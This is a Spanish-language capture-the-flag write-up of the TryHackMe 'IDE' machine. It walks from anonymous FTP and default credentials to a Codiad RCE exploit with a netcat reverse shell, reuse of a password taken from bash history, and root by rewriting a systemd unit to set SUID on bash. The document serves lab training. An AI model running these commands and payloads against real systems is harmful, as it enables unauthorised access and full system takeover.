+++
title = "IDE Machine - Writeup"
author = ["aisak"]
date = 2025-12-31
draft = false
+++

<div class="ox-hugo-toc toc">

<div class="heading">Table of Contents</div>

- [Enumeración](#enumeración)
    - [Escaneo de Puertos (Nmap)](#escaneo-de-puertos--nmap)
        - [Explicación de los comandos utilizados:](#explicación-de-los-comandos-utilizados)
        - [Resultados obtenidos:](#resultados-obtenidos)
    - [Enumeración de FTP](#enumeración-de-ftp)
        - [Hallazgo de Archivo Oculto](#hallazgo-de-archivo-oculto)
        - [Análisis del Mensaje Recuperado](#análisis-del-mensaje-recuperado)
    - [Explotación: Acceso Inicial (Codiad IDE)](#explotación-acceso-inicial--codiad-ide)
        - [Descubrimiento del Servicio Web](#descubrimiento-del-servicio-web)
        - [Ejecución Remota de Código (RCE)](#ejecución-remota-de-código--rce)
    - [Movimiento Lateral: De www-data a drac](#movimiento-lateral-de-www-data-a-drac)
        - [Enumeración del Sistema de Archivos](#enumeración-del-sistema-de-archivos)
        - [Hallazgo de Credenciales en el Historial](#hallazgo-de-credenciales-en-el-historial)
        - [Cambio de Usuario (Lateral Movement)](#cambio-de-usuario--lateral-movement)
    - [Escalación de Privilegios: De drac a root](#escalación-de-privilegios-de-drac-a-root)
        - [Enumeración de privilegios SUDO](#enumeración-de-privilegios-sudo)
        - [Análisis del Servicio Vulnerable](#análisis-del-servicio-vulnerable)
        - [Unidad de Systemd vulnerable](#unidad-de-systemd-vulnerable)
        - [Root shell](#root-shell)

</div>
<!--endtoc-->



## Enumeración {#enumeración}


### Escaneo de Puertos (Nmap) {#escaneo-de-puertos--nmap}

Para identificar la superficie de ataque, se realizó un escaneo completo de los 65,535 puertos TCP.

```bash
nmap -sT -v -Pn -p- -O 10.64.131.31
```


#### Explicación de los comandos utilizados: {#explicación-de-los-comandos-utilizados}

| Flag    | Descripción                                                                                                                                                                                  |
|---------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **-sT** | **TCP Connect Scan**: Realiza el "Three-way Handshake" completo. Es el método por defecto cuando no se tienen privilegios de root o se busca evitar ruidos en redes con firewalls estrictos. |
| **-v**  | **Verbose**: Aumenta el nivel de detalle de la salida, mostrando los puertos abiertos en tiempo real a medida que los encuentra.                                                             |
| **-Pn** | **No Ping**: Omite el descubrimiento de host mediante ICMP. Útil cuando la máquina tiene el firewall bloqueando el ping, asumiendo que el objetivo está encendido.                           |
| **-p-** | **All Ports**: Escanea el rango completo de puertos (del 1 al 65535) en lugar de los 1000 más comunes.                                                                                       |
| **-O**  | **OS Detection**: Intenta determinar el sistema operativo del objetivo analizando las respuestas de la pila TCP/IP.                                                                          |


#### Resultados obtenidos: {#resultados-obtenidos}

| Puerto | Estado | Servicio | Notas                    |
|--------|--------|----------|--------------------------|
| 21     | open   | FTP      | vSFTPd (Posible vector)  |
| 22     | open   | SSH      | Acceso remoto seguro     |
| 80     | open   | HTTP     | Servidor web por defecto |
| 62337  | open   | Unknown  |                          |


### Enumeración de FTP {#enumeración-de-ftp}

Tras el escaneo de puertos, se procedió a revisar el servicio FTP (puerto 21). Se descubrió que permitía el acceso mediante **Anonymous Login**, lo que reveló información crítica sobre los usuarios del sistema.


#### Hallazgo de Archivo Oculto {#hallazgo-de-archivo-oculto}

Dentro del servidor FTP, se identificó una estructura de directorios inusual. El uso de un directorio llamado `...` (tres puntos) es una técnica de ofuscación para pasar desapercibido en listados rápidos.

```bash
ftp> ls -la
# Se observa el directorio drwxr-xr-x 2 0 0 4096 Jun 18 2021 ...
ftp> cd ...
ftp> get ./-
```


#### Análisis del Mensaje Recuperado {#análisis-del-mensaje-recuperado}

El archivo descargado (denominado simplemente `-`) contenía una nota de un usuario llamado ****drac**** dirigida a ****john****:

> "Hey john, I have reset the password as you have asked. Please use the default password to login.
> Also, please take care of the image file ;) - drac."

Este hallazgo es fundamental por dos razones:

1.  Identifica dos nombres de usuario válidos: **john** y **drac**.
2.  Menciona una "contraseña por defecto", lo cual sugiere que podríamos intentar un ataque de fuerza bruta o probar contraseñas comunes (como "password") contra el servicio HTTP o SSH.

<div class="IMPORTANT">

**Nota Técnica:** El archivo tenía un nombre de un solo carácter (`-`). Para descargarlo y leerlo correctamente en Linux, se debe especificar la ruta relativa `./-` para evitar que el sistema lo confunda con un flag de comando.

</div>


### Explotación: Acceso Inicial (Codiad IDE) {#explotación-acceso-inicial--codiad-ide}


#### Descubrimiento del Servicio Web {#descubrimiento-del-servicio-web}

Tras el fallo en los intentos de acceso por SSH con las credenciales sugeridas (`john:password`, `john:ubuntu`), se investigó el puerto alto identificado en el escaneo de Nmap: **62337**.

Al acceder vía navegador a `http://10.64.131.31:62337`, se encontró una instancia del IDE web ****Codiad versión 2.8.4****. Utilizando las credenciales obtenidas indirectamente del FTP (`john:password`), se logró acceso exitoso al panel de administración.


#### Ejecución Remota de Código (RCE) {#ejecución-remota-de-código--rce}

Se identificó que esta versión de Codiad es vulnerable a la ejecución remota de comandos (autenticado). Se utilizó el exploit interactivo de Python (`49705.py`).

```bash
└─$ searchsploit codiad
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                                                                                    | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                                                                        | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                                                   | multiple/webapps/50474.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Para que el exploit funcione correctamente en el entorno de TryHackMe, fue necesario:

1.  Configurar dos oyentes de Netcat (`nc`) en la máquina atacante.

<!--listend-->

```bash
nc -lnvp 4445
nc -lnvp 4446
```

1.  Utilizar la dirección IP de la interfaz `tun0` (VPN) para permitir que la máquina víctima devolviera la conexión (Reverse Shell).

<!--listend-->

```bash
python3 49705.py http://10.64.131.31:62337/ john password <MI_IP_TUN0> 4445 linux
```


### Movimiento Lateral: De www-data a drac {#movimiento-lateral-de-www-data-a-drac}


#### Enumeración del Sistema de Archivos {#enumeración-del-sistema-de-archivos}

Tras obtener la shell inicial como `www-data`, se exploró el directorio `/home` para identificar usuarios reales en el sistema. Se confirmó la existencia del usuario ****drac****.

Al intentar leer el archivo de flag (`user.txt`) en el home de drac, el sistema denegó el acceso debido a permisos restrictivos (`-r--------`), lo que confirmó la necesidad de pivotar a dicho usuario.


#### Hallazgo de Credenciales en el Historial {#hallazgo-de-credenciales-en-el-historial}

Durante la revisión de archivos ocultos en el directorio `/home/drac`, se encontró que el archivo `.bash_history` era legible para otros usuarios o contenía restos de sesiones anteriores. Al inspeccionarlo, se reveló un comando que exponía credenciales en texto claro:

```bash
www-data@ide:/home/drac$ cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```


#### Cambio de Usuario (Lateral Movement) {#cambio-de-usuario--lateral-movement}

Con la contraseña potencial `Th3dRaCULa1sR3aL`. Aunque el servicio MySQL no estaba disponible, la contraseña resultó ser válida para el acceso vía ****SSH****.
El plan entonces fue logearme y leer el archivo como el usuario drac
Tras el cambio de usuario, se obtuvo acceso a la primera flag:

```bash
drac@ide:~$ cat user.txt
[REDACTADO_FLAG_USER]
```


### Escalación de Privilegios: De drac a root {#escalación-de-privilegios-de-drac-a-root}


#### Enumeración de privilegios SUDO {#enumeración-de-privilegios-sudo}

Una vez obtenida la sesión como el usuario ****drac****, se procedió a verificar sus capacidades de superusuario utilizando el comando `sudo -l`.

```bash
drac@ide:~$ sudo -l
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

El resultado indica que ****drac**** puede reiniciar el servicio `vsftpd` con privilegios de root. Esta es una vulnerabilidad crítica si el archivo de unidad del servicio es editable por el usuario.


#### Análisis del Servicio Vulnerable {#análisis-del-servicio-vulnerable}

Se localizó el archivo de unidad de systemd para vSFTPd en `/lib/systemd/system/vsftpd.service`. Al revisar los permisos, se confirmó que el usuario o su grupo tenían permisos de escritura sobre él.


#### Unidad de Systemd vulnerable {#unidad-de-systemd-vulnerable}

Se procedió a modificar el archivo con `nano`, cambiando la directiva `ExecStart`. En lugar de iniciar el servidor FTP, se inyectó un comando para asignar el bit ****SUID**** a la bash del sistema:

```bash
[Service]
Type=simple
# ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf  <-- Comentado o reemplazado
ExecStart=/bin/chmod +s /bin/bash
```


#### Root shell {#root-shell}

1.  ****Recargar systemd****: Para que el sistema reconozca la modificación del archivo.
    ```bash
    systemctl daemon-reload
    ```

2.  ****Reiniciar el servicio****: Aprovechando el permiso de sudo obtenido anteriormente.
    ```bash
    sudo /usr/sbin/service vsftpd restart
    ```

3.  ****Invocar la Shell de Root****: Al reiniciarse el servicio, el comando `chmod +s` se ejecutó como root. Ahora, al invocar la bash con el flag `-p` (privileged), se obtiene acceso total.

<!--listend-->

```bash
drac@ide:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2021 /bin/bash
drac@ide:~$ bash -p
bash-4.4# whoami
root
```
